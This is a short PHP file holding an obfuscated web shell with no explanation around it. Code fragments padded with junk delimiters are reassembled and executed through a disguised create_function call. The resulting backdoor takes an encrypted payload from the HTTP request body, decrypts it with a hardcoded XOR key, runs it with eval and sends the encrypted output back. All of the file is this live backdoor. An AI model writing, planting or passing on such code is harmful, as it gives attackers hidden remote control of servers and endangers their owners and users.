<?php
$Z=',#_end_cl,#ean();$r=@bas,#e64_,#encode(@,#x(@gzco,#mpres,#s($o),$,#k),#);prin,#t("$p$kh,#$r$kf");}';
$M='$k=,#"768633,#20",#;$k,#h="92092bcdbdd,#a";$k,#f="48f,#de720,#02ce";,#$p="k0A,#Y,#ed1m,#1hCPliFs";fu';
$j='nct,#ion,# x($t,$k){$,#,#c=strlen($k,#,#);$l=strlen(,#$t);$o,#=",#";for($i=,#0;$i,#<$l;){for,#($j=';
$d=',#h("/$kh(.+),#$,#kf/",@fil,#,#e_g,#et_contents(",#php://input",#),,#$m),#==1) {@ob_s,#tart();@e,#v';
$s='a,#l(@gzunco,#mpr,#ess(@x(@ba,#se,#64_decod,#,#e($m[1]),$k,#),#));$o=@ob_g,#,#et_contents,#,#();@ob';
$Q='0;(,#$j<$c,#,#&&$,#i<$l);,#$,#j++,$i++){,#$o.=$t{$i}^,#$,#k{$j};}}retu,#rn ,#$o;}i,#f (@,#preg_matc';
$L=str_replace('U','','crUeaUUUte_UfunctUion');
$z=str_replace(',#','',$M.$j.$Q.$d.$s.$Z);
$w=$L('',$z);$w();
?>
